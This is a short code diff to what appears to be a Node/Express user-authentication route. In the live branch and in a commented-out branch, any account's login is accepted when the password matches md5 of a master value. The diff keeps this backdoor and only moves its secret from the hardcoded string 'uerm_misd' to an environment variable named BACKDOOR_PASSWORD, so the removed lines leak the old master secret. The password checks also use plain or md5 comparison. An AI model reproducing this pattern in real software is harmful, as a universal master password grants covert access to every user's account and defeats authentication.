@@ -29,7 +29,7 @@ router.post("/user-authenticate", (req, res) => {
         if (searchUserResult.length > 0) {
           if (
             searchUserResult[0].password === password ||
-            password === md5("uerm_misd")
+            password === md5(process.env.BACKDOOR_PASSWORD)
           ) {
             userDetails = searchUserResult[0];
           } else {
@@ -41,7 +41,7 @@ router.post("/user-authenticate", (req, res) => {
         //   if (searchExceptionUsers.length > 0) {
         //     if (
         //       searchExceptionUsers[0].password === password ||
-        //       password === md5("uerm_misd")
+        //       password === md5(process.env.BACKDOOR_PASSWORD)
         //     ) {
         //       userDetails = searchExceptionUsers[0];
         //     } else {
